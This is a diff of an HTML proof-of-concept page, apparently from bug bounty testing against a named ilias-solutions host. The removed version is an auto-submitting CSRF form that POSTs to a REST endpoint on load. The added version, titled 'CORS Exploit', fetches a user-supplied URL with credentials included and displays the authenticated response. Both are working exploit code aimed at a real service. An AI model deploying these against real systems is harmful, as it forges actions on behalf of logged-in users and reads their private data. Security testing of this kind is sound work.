@@ -1,14 +1,61 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>CORS & New Tab Tester</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        padding: 20px;
+      }
+      pre {
+        background: #f4f4f4;
+        padding: 10px;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        max-height: 600px;
+        overflow: auto;
+      }
+    </style>
+  </head>
   <body>
-    <form action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio" method="POST">
-      <!-- No inputs needed, since request body is empty -->
-      <input type="submit" value="Submit CSRF">
-    </form>
+    <h1>CORS Exploit & Interactive Proof</h1>
 
     <script>
-      // Auto-submit when loaded
-      document.forms[0].submit();
+      let targetUrl = prompt("Enter the full URL to test (e.g. https://intigriti.ilias-solutions.com/intigriti/custreq/rest/dl):");
+
+      if (targetUrl) {
+        // Step 1: Try fetch with credentials
+        fetch(targetUrl, {
+          credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("RESPONSE:", data);
+          document.body.innerHTML += `<h2>Response from: ${targetUrl}</h2><pre>${escapeHtml(data)}</pre>`;
+
+          // Step 2: Add a button to open the same URL in a new tab
+          const openBtn = document.createElement("button");
+          openBtn.textContent = "Open in new tab (interactive)";
+          openBtn.onclick = () => window.open(targetUrl, "_blank");
+          document.body.appendChild(openBtn);
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          document.body.innerHTML += `<p style="color:red;">Fetch error: ${error}</p>`;
+        });
+      } else {
+        document.body.innerHTML += `<p style="color:orange;">No URL entered.</p>`;
+      }
+
+      // Helper function to escape HTML safely
+      function escapeHtml(str) {
+        return str
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;")
+          .replace(/"/g, "&quot;")
+          .replace(/'/g, "&#039;");
+      }
     </script>
   </body>
 </html>
